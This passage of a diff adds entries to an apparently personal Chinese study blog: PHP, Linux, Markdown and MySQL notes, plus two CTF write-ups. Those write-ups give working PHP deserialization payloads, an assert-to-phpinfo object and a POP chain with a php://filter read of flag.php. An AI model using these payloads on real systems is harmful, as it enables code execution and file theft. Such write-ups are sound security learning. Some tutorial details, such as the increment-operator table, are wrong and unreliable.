+3. 在表创建后修改约束基本格式alter table 表名 modify 列名 数据类型 约束;
+删除约束基本格式alter table 表名 modify 列名 数据类型;# 不加约束，默认为允许null
+
+
+
+
+]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[NPUCTF2020]ReadlezPHP,反序列化漏洞</title>
+    <url>/2026/05/16/NPUCTF2020-ReadlezPHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[进入题目，查看网页源码
+发现可疑网址，点击进入
+找到题目代码，是反序列化题目核心代码为：public function __destruct()&#123;        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    &#125;
+可以构造变量a—&gt;phpinfo()，变量b—&gt;assert；组合起来后—&gt;assert(phpinfo()),使代码执行phpinfo()assert()函数的功能：
+在 PHP 8 以前的版本（如 5.x），assert() 的参数可以是字符串，并会像 eval() 一样被执行
+
+构造出序列化字符串
+O:8:”HelloPhp”:2:{s:1:”a”;s:9:”phpinfo()”;s:1:”b”;s:6:”assert”;}
+
+get传输使网页执行phpinfo()
+传输之前要把source参数去掉，否则会优先执行highlight_file(FILE);的结果而覆盖phpinfo()的执行结果
+
+ctrl+f搜索flag查找到flag
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[MRCTF2020]Ezpop,构造反序列化pop链</title>
+    <url>/2026/05/13/MRCTF2020-Ezpop-%E6%9E%84%E9%80%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</url>
+    <content><![CDATA[拿到题目后先解析代码class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;
+从代码中可以看出
+Modifier类是一个过滤器类，用于过滤输入的文件路径
+Show类是一个显示类，用于显示文件内容
+Test类是一个测试类，用于测试Modifier类的过滤功能
+__wakeup方法用于在反序列化时检查文件路径是否包含特殊字符，如有则过滤
+
+构造pop链1. 发现Modifier类中有include函数,可以作为突破口，把flag.php包含进来查看flag，但是有__invoke方法，所以只有它被当成函数执行的时候才会执行2. 又发现Test类中有__get方法，它把$p变量当成了函数执行，所以可以把$p变量的值设置为Modifier类的实例，这样就可以在__get方法中调用Modifier类的__invoke方法，从而包含flag.php文件，但是只有调用不存在或无法访问的属性时才会调用__get方法3. 发现Show类中__toString方法，它调用了$str变量的source属性，可以把$str变量的值设置为Test类的实例，因为Test中没有source属性，所以这样就可以在__toString方法中调用Test类的__get方法，但是只有它被当成字符串执行时才会调用__toString方法4. 而Show中的construct方法把source属性当成了字符串执行，所以可以把source属性的值设置为Show类的实例，这样就可以在__construct方法中调用Show类的__toString方法，从而包含flag.php文件执行pop链把Modifier类的var属性设置为flag.php,然后各种赋值，最后序列化class Modifier&#123;    protected  $var = &#x27;flag.php&#x27;;    public function append($value)    &#123;        include($value);    &#125;    public function __invoke()    &#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;
+$a = new Modifier;$b = new Show();$c = new Test;$c-&gt;p = $a;$b-&gt;str = $c;$b-&gt;source = $b;echo serialize($b);
+得到序列化字符串
+O:4:”Show”:2:{s:6:”source”;r:1;s:3:”str”;O:4:”Test”:1:{s:1:”p”;O:8:”Modifier”:1:{s:6:”%00*%00var”;s:8:”flag.php”;}}}在*前后加上%00（尽量整个字符串都url编码，这里懒得编码了）
+
+get传参序列化字符串
+并没有显示flag,猜测文件并没有直接输出flag而是设置在变量中，所以把Modifier类的var属性设置为php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php拿到文件的base64编码
+然后解码得到flag
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP高级用法</title>
+    <url>/2026/04/08/PHP%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[日期和时间date() 函数
+date() 函数用于格式化日期和时间。
+
+&lt;?phpecho date(&quot;Y/m/d&quot;) . &quot;&lt;br&gt;&quot;;echo date(&quot;Y.m.d&quot;) . &quot;&lt;br&gt;&quot;;echo date(&quot;Y-m-d&quot;);?&gt;
+输出结果2026/04/082026.04.082026-04-08
+
+
+
+format字符
+描述
+返回值例子
+
+
+
+Y
+年，四位数字
+例如：1999 或 2003
+
+
+y
+年，两位数字
+例如：99 或 03
+
+
+m
+月，两位数字
+01-12
+
+
+M
+月，完整名称
+January 到 December
+
+
+d
+月份中的第几天，有前导零的 2 位数字
+01-31
+
+
+j
+月份中的第几天，没有前导零
+1-31
+
+
+D
+星期几，缩写
+Mon - Sun
+
+
+l
+星期几,完整名称
+Monday - Sunday
+
+
+H
+小时，24小时制
+00 - 23
+
+
+h
+小时，12小时制
+00 - 12
+
+
+i
+分钟，两位数字
+00 - 59
+
+
+s
+秒，两位数字
+00 - 59
+
+
+包含include() 函数和 require() 函数
+include() 函数和 require() 函数用于包含其他文件的内容
+
+include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：
+require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。
+include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。
+尽量使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性
+
+使用方法&lt;?phpinclude &quot;file.php&quot;;或require &quot;file.php&quot;;?&gt;
+把文件包含后，可以直接调用文件中的公共变量文件处理打开文件&lt;?php$filehandle = fopen(&quot;filename.txt&quot;, &quot;r&quot;);?&gt;
+文件可以通过以下模式打开
+
+
+模式
+描述
+
+
+
+r
+只读，在文件开头读开始
+
+
+r+
+读写，在文件开头读开始
+
+
+w
+只写，打开并清空文件的内容；如果文件不存在，则创建新文件。
+
+
+w+
+读写，打开并清空文件的内容；如果文件不存在，则创建新文件。
+
+
+a
+追加。打开并向文件末尾进行写内容，如果文件不存在，则创建新文件。
+
+
+a+
+读&#x2F;追加，打开并向文件末尾进行写内容，保持文件指针在文件末尾，保持文件内容
+
+
+x
+只写，创建新文件。如果文件已存在，则返回 FALSE 和一个错误。
+
+
+x+
+读写，创建新文件。如果文件已存在，则返回 FALSE 和一个错误。
+
+
+注意：如果 fopen() 函数无法打开指定文件，则返回 0 (false)。关闭文件&lt;?phpfclose($filehandle);?&gt;
+检测文件末尾feof() 函数用于检测文件是否到达末尾。读取文件内容fgets() 函数用于读取文件的一行。# 读取文件的最后一行&lt;?phpif (!feof($filehandle)) &#123;    echo fgets($filehandle);&#125;?&gt;
+运用两函数逐行读取文件内容?php$file = fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);// 读取文件每一行，直到文件结尾while(!feof($file))&#123;    echo fgets($file). &quot;&lt;br&gt;&quot;;&#125;fclose($file);?&gt;
+cookiecookie是一种小文本文件，用于存储用户信息，例如用户名、密码等。当同一个用户再次访问网站时，网站可以使用 cookie来识别用户。setcookie() 函数用于设置 cookie。语法&lt;?phpsetcookie(&quot;cookie名&quot;, &quot;cookie值&quot;, time());?&gt;
+实例&lt;?phpsetcookie(&quot;user&quot;, &quot;lah&quot;, time() + (60 * 5));?&gt;
+回收 cookie可用 $_COOKIE 数组来回收 cookie&lt;?php// 输出 cookie 值echo $_COOKIE[&quot;user&quot;];// 查看所有 cookieprint_r($_COOKIE);?&gt;
+可用isset() 函数来检查 cookie 是否设置&lt;?phpif (isset($_COOKIE[&quot;user&quot;]))    echo &quot;欢迎 &quot; . $_COOKIE[&quot;user&quot;] . &quot;!&lt;br&gt;&quot;;else    echo &quot;普通访客!&lt;br&gt;&quot;;?&gt;
+删除 cookie把时间设置为过去的时间（负数）&lt;?phpsetcookie(&quot;user&quot;, &quot;&quot;, time() - (60 * 5));?&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2026/03/12/hello-world/</url>
+    <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick StartCreate a new post$ hexo new &quot;My New Post&quot;
+
+More info: Writing
+Run server$ hexo server
+
+More info: Server
+Generate static files$ hexo generate
+
+More info: Generating
+Deploy to remote sites$ hexo deploy
+
+More info: Deployment
+]]></content>
+  </entry>
+  <entry>
+    <title>linux三剑客</title>
+    <url>/2026/03/25/linux%E4%B8%89%E5%89%91%E5%AE%A2/</url>
+    <content><![CDATA[一. grep —— 文本搜索工具作用：根据正则表达式或固定字符串，从文件或标准输入中过滤出匹配的行。基本语法:grep [选项] PATTERN [文件…]常用选项：-i：忽略大小写r：递归搜索目录中的文件-v：反向匹配，显示不包含匹配的行-n：显示匹配行的行号-l：仅列出包含匹配的文件名常用场景：1.搜索日志中的错误信息2.从配置文件中查找特定设置3.结合管道过滤其他命令的输出常见用法：
+grep “error” app.log          # 在文件中搜索包含 error 的行
+grep -i “warning” app.log     # 忽略大小写
+grep -r “TODO” .&#x2F;src          # 递归搜索目录下所有文件
+grep -E “error|fail” log      # 使用扩展正则匹配多个模式
+
+二. sed —— 流编辑器作用：非交互式地对文本进行增、删、改、查等编辑操作，尤其适合脚本中批量处理文本。基本语法：sed [选项] ‘命令’ 文件常用选项：-e：添加执行的脚本-i：直接修改文件-n：取消默认输出常用命令：s&#x2F;regexp&#x2F;replacement&#x2F;g：替换匹配的文本d：删除匹配的行p：打印匹配的行常用场景：1.替换文件中的文本2.删除空行或指定行3.在指定行前&#x2F;后插入内容在文本中插入或添加内容:1. 在指定行前插入（i）sed &#x27;3 i\这是插入的内容&#x27; file.txt   # 在第3行前插入一行sed &#x27;/pattern/ i\内容&#x27; file.txt     # 在匹配到的行前插入
+2. 在指定行后追加（a）sed &#x27;3 a\这是追加的内容&#x27; file.txt   # 在第3行后追加一行sed &#x27;/pattern/ a\内容&#x27; file.txt     # 在匹配到的行后追加
+3. 在文件末尾追加sed &#x27;$ a\最后一行追加的内容&#x27; file.txt
+4. 在文件开头插入sed &#x27;1 i\第一行插入的内容&#x27; file.txt
+常见用法：
+sed ‘s&#x2F;old&#x2F;new&#x2F;g’ file.txt     # 将所有 old 替换为 new（打印到终端）
+sed -i ‘s&#x2F;old&#x2F;new&#x2F;g’ file.txt  # 直接修改文件（-i 参数）
+sed ‘&#x2F;^$&#x2F;d’ file.txt           # 删除空行
+sed -n ‘5,10p’ file.txt        # 打印第5到10行
+
+三. awk —— 文本处理与报告生成工具作用：一种强大的编程语言，擅长按列处理结构化文本，支持条件判断、循环、数组和格式化输出。基本语法：awk ‘脚本’ 文件常用选项：-F：指定字段分隔符常用内置变量：1.NR：记录的行号2.NF：字段的个数3.$0：当前行的全部文本4.$n：第n个字段常用场景：1.提取日志中的特定字段（如 IP、时间）2.对数据进行求和、统计3.将非结构化文本整理成报表常见用法：
+awk ‘{print $1}’ file.txt      # 打印每行的第一列（默认以空格&#x2F;制表符分隔）
+awk ‘$3 &gt; 100 {print $1, $2}’ data.txt    （第三列大于100时打印前两列）
+awk -F’,’ ‘{sum+&#x3D;$2} END {print sum}’ data.csv    （对CSV文件第二列求和）
+awk ‘&#x2F;example&#x2F; {print NR, $0}’ filename.txt（打印包含”example”的行的行号和内容）
+
+]]></content>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>markdown语法</title>
+    <url>/2026/03/28/markdown%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[一.Markdown标题语法要创建标题，请在单词或短语前面添加井号 (#) 。# 的数量代表了标题的级别。
+#一级标题##二级标题###三级标题####四级标题
+二.Markdownd段落语法创建段落，要使用空白行将一行或多行文本进行分隔。
+段落a
+段落b
+段落c
+
+注意：（不要用空格或制表符（ tabs）缩进段落。）三.Markdown的换行语法在一行的末尾添加两个或多个空格，然后按回车键,即可创建一个换行。（为了兼容性，可以在行尾添加“结尾空格”或 HTML 的 &lt;br&gt; 标签来实现换行。）
+
+四.Markdown的强调语法粗体
+
+
+语法
+文本
+预览
+
+
+
+**  **
+**粗体**字符
+粗体字符
+
+
+__  __（不建议）
+__粗体__字符
+粗体字符
+
+
+斜体
+
+
+语法
+文本
+预览
+
+
+
+*  *
+*斜体*字符
+斜体字符
+
+
+_  _（不建议）
+_斜体_字符
+斜体字符
+
+
+粗体加斜体
+
+
+语法
+文本
+预览
+
+
+
+***  ***
+***粗斜***字符
+粗斜字符
+
+
+___  ___
+___粗斜___字符
+粗斜字符
+
+
+五.Markdown引用语法要创建块引用，请在段落前添加一个 &gt; 符号。
+这是一个块引用
+块引用可以包含多个段落，每个段落前都需要添加 &gt; 符号。
+
+嵌套块引用
+这是一个块引用
+
+这是一个嵌套的块引用
+
+这是一个更深层的嵌套块引用
+
+
+
+六.Markdown列表语法无序列表要创建无序列表，请在每个列表项前添加破折号 (-)、星号 (*) 或加号 (+) 。
+
+
+列表项 1
+列表项 2
+列表项 3
+
+
+有序列表要创建有序列表，请在每个列表项前添加数字和一个英文句点。
+
+第一个列表项
+第二个列表项
+第三个列表项
+
+
+嵌套列表
+
+第一个列表项
+嵌套的无序列表项
+嵌套的无序列表项
+
+
+第二个列表项
+嵌套的有序列表项
+嵌套的有序列表项
+
+
+
+
+七.Markdown代码语法行内代码要将单词或短语表示为代码，请将其包裹在反引号 (`) 中。
+
+这是 行内代码 示例
+代码块要创建代码块，请将代码块的每一行都缩进至少四个空格或一个制表符。
+function hello() &#123;    console.log(&quot;Hello, Markdown!&quot;);&#125;
+
+或者可以使用三个反引号 (```) 来创建代码块，这是更常用的方法：
+function hello() &#123;    console.log(&quot;Hello, Markdown!&quot;);&#125;
+
+八.Markdown分隔线语法要创建分隔线，请在单独一行上使用三个或更多的星号 (***)、破折号 (---) 或下划线 (___) ，并且不能包含其他内容。
+
+
+
+
+
+九.Markdown链接语法基本链接要创建链接，请使用方括号 [] 包裹链接文本，后面跟着圆括号 () 包裹链接地址。
+[文本](网址)
+百度
+
+带标题的链接还可以在链接地址后面添加可选的标题，用引号包裹。
+[文本](网址 “标题”)
+百度
+
+引用样式链接引用样式链接由两部分组成：
+&gt;[文本1](网址1 “标题1”)&gt;[文本2](网址2 “标题2”)
+百度Google
+
+十.Markdown图片语法基本图片要添加图片，请使用感叹号 (!)，后跟方括号 [] 包裹替代文本，然后是圆括号 () 包裹图片链接。
+![示例图片](图片地址)
+带标题的图片您还可以在图片链接后面添加可选的标题，用引号包裹。
+
+![示例图片](图片地址 “图片标题”)
+引用样式图片与链接类似，图片也可以使用引用样式：
+
+![示例图片](图片地址 “图片标题”)
+十一.Markdown转义字符语法要显示原本用于格式化 Markdown 文档的特殊字符，请在字符前添加反斜杠 (\)。
+* 这不是斜体文本 *# 这不是标题[ 这不是链接开始
+]]></content>
+      <tags>
+        <tag>markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP语法</title>
+    <url>/2026/04/04/PHP%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[一.PHP中的注释// 或 # 单行注释/*    多行注释*//**    文档注释*/
+二.PHP中变量作用域全局变量
+全局变量是在函数外部定义的变量，可以在任何地方访问。
+
+局部变量
+局部变量是在函数内部定义的变量，只能在函数内部访问。
+
+global 关键字
+global 关键字用于在函数内部访问全局变量，变量前加上global为全局变量。
+
+static 关键字
+static 关键字用于在函数内部定义的变量，变量前加上static为静态变量。
+
+function test() &#123;    static $count = 0;    $count++;    echo $count;# 每次使用static变量，都会保留上次的值# 注意：该变量是函数的局部变量&#125;
+三.PHP中EOFPHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法。
+必须后接分号，否则编译通不过。
+EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。
+EOF 可以在字符串内部嵌套EOF
+结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。
+开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。
+
+&lt;?phpecho &lt;&lt;&lt;EOF        &lt;h1&gt;第一个标题&lt;/h1&gt;        &lt;p&gt;第一个段落。&lt;/p&gt;EOF;// 结束需要独立一行且前后不能空格?&gt;
+四.PHP中常量常量的特征
+不变性: 常量一旦定义，其值不能改变
+全局作用域: 常量在定义后，可以在整个脚本的任何地方使用，无需使用 global 关键字。
+数据类型: 常量的值可以是标量数据类型（如布尔值、整数、浮点数、字符串）或数组（PHP 7 及以上版本）。
+区分大小写: 常量名称默认是区分大小写的。如果需要定义大小写不敏感的常量，可以在 define() 函数的第三个参数设置为 true。
+常量名不需要加 $ 修饰符。
+
+定义常量define(’常量名‘, 常量值，true(可选属性,不区分大小写));
+const 常量名 = 常量值;
+预定义常量PHP 提供了一些预定义常量，可以在脚本中直接使用。这些常量通常用于获取 PHP 的配置信息、版本信息等。常见的预定义常量有：
+PHP_VERSION当前 PHP 解析器的版本。
+PHP_OS：服务器的操作系统。
+PHP_INT_MAX：最大的整数值。
+E_ERROR、E_WARNING、E_PARSE 等：错误报告级别。
+
+实例echo PHP_VERSION;（当前 PHP 解析器的版本）echo PHP_OS;（输出服务器的操作系统）echo PHP_INT_MAX;（输出最大的整数值）
+五.字符串字符串的特征
+字符串可以包含任意字符，包括空格、制表符、换行符等字符。
+
+实例$str = &#x27;hello world&#x27;;echo $str;（输出 hello world）
+strpos()函数
+strpos() 函数用于在字符串内查找一个字符或一段指定的文本。如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。
+
+&lt;?phpecho strpos(&quot;Hello world!&quot;,&quot;world&quot;);?&gt;# 输出：6
+运算符递增&#x2F;递减运算符
+
+
+运算符
+名称
+描述
+
+
+
+x++
+后递增
+x+1再返回x
+
+
+++x
+预递增
+先返回x再+1
+
+
+x–
+后递减
+x-1再返回x
+
+
+–x
+预递减
+先返回x再-1
+
+
+比较运算符
+
+
+运算符
+名称
+描述
+
+
+
+x&#x3D;&#x3D;&#x3D;y
+完全等于
+值和类型都相
+
+
+x&#x3D;&#x3D;y
+等于
+值相等
+
+
+x!&#x3D;&#x3D;y
+不绝对等于
+值或类型不相等
+
+
+x!&#x3D;y
+不等于
+值不相等
+
+
+x&lt;&gt;y
+不等于
+值不相等
+
+
+三目运算符expr1 ? expr2 : expr3
+如果 expr1 为 TRUE，则返回 expr2；否则返回 expr3。
+
+实例$username = isset($_GET[&#x27;user&#x27;]) ? $_GET[&#x27;user&#x27;] : &#x27;nobody&#x27;;echo $username;# 如果 $_GET[&#x27;user&#x27;] 不存在返回 &#x27;nobody&#x27;，否则返回 $_GET[&#x27;user&#x27;] 的值
+组合比较符组合比较符也称之为太空船操作符，符号为 &lt;&#x3D;&gt;。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。实例&lt;?php// 整型echo 1 &lt;=&gt; 1; // 输出0echo 1 &lt;=&gt; 2; // 输出-1echo 2 &lt;=&gt; 1; // 输出1 // 浮点型echo 1.5 &lt;=&gt; 1.5; // 输出0echo 1.5 &lt;=&gt; 2.5; // 输出-1echo 2.5 &lt;=&gt; 1.5; // 输出1  // 字符串echo &quot;a&quot; &lt;=&gt; &quot;a&quot;; // 输出0echo &quot;a&quot; &lt;=&gt; &quot;b&quot;; // 输出-1echo &quot;b&quot; &lt;=&gt; &quot;a&quot;; // 输出1?&gt;
+switch语句基本结构&lt;?phpswitch (expression) &#123;    case value1:        // 代码块1        break;    case value2:        // 代码块2        break;    // 更多的 case 语句    default:        // 如果没有匹配的值&#125;?&gt;
+
+expression 是要被比较的表达式。case value: 是可能的值，如果 expression 的值等于某个 case 的值，就执行相应的代码块。break; 用于终止 switch 语句，防止继续执行下一个 case。default: 是可选的，用于指定当没有匹配的 case 时执行的代码块。
+
+数组的排序函数
+sort()：对数组进行升序排序。
+rsort()：对数组进行降序排序。
+asort()：根据关联数组的值对数组进行升序排序。
+arsort()：根据关联数组的值对数组进行降序排序。
+ksort()：根据关联数组的键对数组进行升序排序。
+krsort()：根据关联数组的键对数组进行降序排序。
+
+PHP的超级全局变量超级全局变量列表：
+$_REQUEST：包含所有请求参数的数组。
+$_GET：包含所有 GET 请求参数的数组。
+$_POST：包含所有 POST 请求参数的数组。
+$_COOKIE：包含所有 COOKIE 请求参数的数组。
+$_SESSION：包含所有 SESSION 请求参数的数组。
+$_SERVER：包含所有 SERVER 请求参数的数组。
+
+$_SERVER全局变量中的重要元素：
+
+
+元素
+描述
+
+
+
+$_SERVER[‘PHP_SELF’]
+当前脚本的路径
+
+
+$_SERVER[‘SERVER_NAME’]
+服务器名称
+
+
+$_SERVER[‘SERVER_PORT’]
+服务器端口
+
+
+$_SERVER[‘REQUEST_METHOD’]
+请求方法
+
+
+$_SERVER[‘REQUEST_URI’]
+请求 URI
+
+
+$_SERVER[‘REMOTE_ADDR’]
+客户端 IP 地址
+
+
+$_SERVER[‘HOST’]
+主机名
+
+
+while语句基本结构&lt;?phpwhile (条件) &#123;    要执行的代码&#125;?&gt;
+实例&lt;?php$i = 0;while ($i &lt; 5) &#123;    echo $i;    $i++;&#125;?&gt;
+另一种结构do&#123;    要执行的代码;&#125;while (条件);
+实例&lt;?php$i = 0;do&#123;    echo $i;    $i++;&#125;while ($i &lt; 5);?&gt;
+for语句基本结构&lt;?phpfor (初始化; 条件; 增量) &#123;    要执行的代码&#125;?&gt;
+实例&lt;?php$i = 0;for ($i = 0; $i &lt; 5; $i++) &#123;    echo $i;&#125;?&gt;
+foreach循环
+foreach循环用于遍历数组。
+
+基本结构&lt;?phpforeach (array as value)&#123;    要执行的代码&#125;# 关联数组foreach (array as key =&gt; value) &#123;    要执行的代码&#125;?&gt;
+实例&lt;?php$x=array(1=&gt;&quot;Google&quot;, 2=&gt;&quot;Runoob&quot;, 3=&gt;&quot;Taobao&quot;);foreach ($x as $key =&gt; $value)&#123;    echo &quot;key  为 &quot; . $key . &quot;，对应的 value 为 &quot;. $value . PHP_EOL;&#125;?&gt;
+
+PHP函数中的魔法变量FILE
+__FILE__魔法变量用于获取当前脚本的路径。
+
+LINE
+__LINE__魔法变量用于获取当前脚本的行号。
+
+NAMESPACE
+__NAMESPACE__魔法变量用于获取当前命名空间。
+
+CLASS
+__CLASS__魔法变量用于获取当前类的名称。
+
+METHOD
+__METHOD__魔法变量用于获取当前方法的名称。
+
+FUNCTION
+__FUNCTION__魔法变量用于获取当前函数的名称。
+
+DIR
+__DIR__魔法变量用于获取当前脚本所在目录。
+
+类和面向对象类的定义格式&lt;?phpclass phpClass &#123;  var $var1;  var $var2 = &quot;constant string&quot;;    function myfunc ($arg1, $arg2) &#123;     [..]  &#125;  [..]&#125;?&gt;
+
+使用 class 关键字后加上类名定义。
+类名后的一对大括号({})内可以定义变量和方法。
+类的变量使用 var 来声明, 变量也可以初始化值。
+函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。
+
+实例&lt;?phpclass Site &#123;  /* 成员变量 */  var $url;  var $title;    /* 成员函数 */  function setUrl($par)&#123;     $this-&gt;url = $par;  &#125;    function getUrl()&#123;     echo $this-&gt;url . PHP_EOL;  &#125;    function setTitle($par)&#123;     $this-&gt;title = $par;  &#125;    function getTitle()&#123;     echo $this-&gt;title . PHP_EOL;  &#125;&#125;# this 关键字用于在类内部访问当前对象的属性和方法，$this-&gt;当前对象的属性名。?&gt;
+调用函数&lt;?php$site = new Site();$site-&gt;setUrl(&quot;www.baidu.com&quot;);$site-&gt;getUrl();$site-&gt;setTitle(&quot;百度&quot;);$site-&gt;getTitle();?&gt;
+构造函数
+构造函数是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，在创建对象的语句中与 new 运算符一起使用。
+
+实例function __construct( $par1, $par2 ) &#123;   $this-&gt;url = $par1;   $this-&gt;title = $par2;&#125;$runoob = new Site(&#x27;www.runoob.com&#x27;, &#x27;菜鸟教程&#x27;);$runoob-&gt;getUrl();$runoob-&gt;getTitle();# 可以在构造函数中初始化对象成员变量赋初始值，不需要再调用 setTitle 和 setUrl 方法了
+析构函数
+析构函数是一种特殊的方法。主要用来在对象被销毁时执行一些清理工作。析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。
+
+实例&lt;?phpclass MyDestructableClass &#123;   function __construct() &#123;       print &quot;构造函数\n&quot;;       $this-&gt;name = &quot;MyDestructableClass&quot;;   &#125;   function __destruct() &#123;       print &quot;销毁 &quot; . $this-&gt;name . &quot;\n&quot;;   &#125;&#125;$obj = new MyDestructableClass();?&gt;
+输出结果：构造函数销毁 MyDestructableClass
+继承PHP 使用关键字 extends 来继承一个类，PHP 不支持多继承，格式如下：class Child extends Parent &#123;   // 代码部分&#125;
+实例&lt;?php // 子类扩展站点类别class Child_Site extends Site &#123;   var $category;    function setCate($par)&#123;        $this-&gt;category = $par;    &#125;      function getCate()&#123;        echo $this-&gt;category . PHP_EOL;    &#125;&#125;#Child_Site 类继承了 Site 类，并扩展了功能?&gt;
+方法重写
+如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。
+
+function getUrl() &#123;   echo $this-&gt;url . PHP_EOL;   return $this-&gt;url;&#125;   function getTitle()&#123;   echo $this-&gt;title . PHP_EOL;   return $this-&gt;title;&#125;
+方法的访问控制
+
+
+方法
+访问控制
+描述
+
+
+
+public
+公共
+所有对象都可以访问
+
+
+protected
+受保护
+子类和父类可以访问
+
+
+private
+私有
+只有当前类可以访问
+
+
+&lt;?php/** * Define MyClass */class MyClass&#123;    public $public = &#x27;Public&#x27;;    protected $protected = &#x27;Protected&#x27;;    private $private = &#x27;Private&#x27;;    function printHello()    &#123;        echo $this-&gt;public;        echo $this-&gt;protected;        echo $this-&gt;private;    &#125;&#125;$obj = new MyClass();echo $obj-&gt;public; // 这行能被正常执行echo $obj-&gt;protected; // 这行会产生一个致命错误echo $obj-&gt;private; // 这行也会产生一个致命错误$obj-&gt;printHello(); // 输出 Public、Protected 和 Private?&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux基本命令</title>
+    <url>/2026/03/15/linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[Linux的一些基本指令一.ls -l命令ls基本为列出当前目录的文件和文件夹，也可添加-a,-h,-l选项（三者可搭配使用）
+-a：列出目录内所有内容（包括隐藏文件和文件夹） 
+-l：以列表形式展示内容，并显示更多信息
+-h: 以易于阅读的形式列出文件大小，如K,M,G（-h选项必须要搭配-l使用）
+
+
+二.touch创建文件如果文件不存在，touch 文件名 ,创建一个空文件。如果文件已存在，touch 更新文件的访问和修改时间为当前时间。
+示例：touch newfile.txt 创建空文件newfile.txt，touch -t 202503151200 file.txt 将file.txt的时间戳设为2025年3月15日12:00
+三.管道符 | 的应用管道符将前一个命令的标准输出作为后一个命令的标准输入。示例：
+
+ls -l | grep “flag”：列出当前目录所有文件，然后过滤出包含”txt”的行。
+· cat &#x2F;var&#x2F;log&#x2F;syslog | tail -n 20：显示日志文件最后20行。
+· echo “hello” | wc -c：统计字符串的字符数。
+
+
+四.mv指令mv 用于移动文件或重命名。
+重命名：mv 原文件名 新文件名
+示例：mv old.txt new.txt 将old.txt重命名为new.txt。
+
+
+移动：mv 文件名 目标目录&#x2F;
+示例：mv file.txt &#x2F;home&#x2F;user&#x2F;docs&#x2F; 将file.txt移动到docs目录。
+
+
+同时移动并重命名：mv 文件名 目标目录&#x2F;新文件名
+示例：mv report.txt &#x2F;backup&#x2F;report_20250315.txt。
+
+
+
+注意：如果目标已存在，mv 会直接覆盖（可用 -i 选项提示确认）。示例：mv -i source.txt dest.txt 若dest.txt存在则询问是否覆盖。
+五.软链接软连接（符号链接）类似于Windows的快捷方式，指向另一个文件或目录。
+创建：ln -s 目标文件 链接名
+示例：ln -s &#x2F;home&#x2F;user&#x2F;data.txt link.txt 创建指向data.txt的软连接link.txt。
+
+
+使用：通过链接名访问，如同访问原文件一样。例如 cat link.txt 会显示data.txt的内容。
+查看链接指向：ls -l link.txt 会显示 link.txt -&gt; &#x2F;home&#x2F;user&#x2F;data.txt。
+注意事项：
+如果原文件被删除或移动，链接会失效（“断链”）。
+链接可跨文件系统。示例：为目录创建软连接 ln -s &#x2F;var&#x2F;log logs，然后可以通过 cd  logs 进入&#x2F;var&#x2F;log目录。  
+
+
+
+六.用cp指令复制文件到指定位置
+复制文件到目录：cp 源文件 目标目录&#x2F;
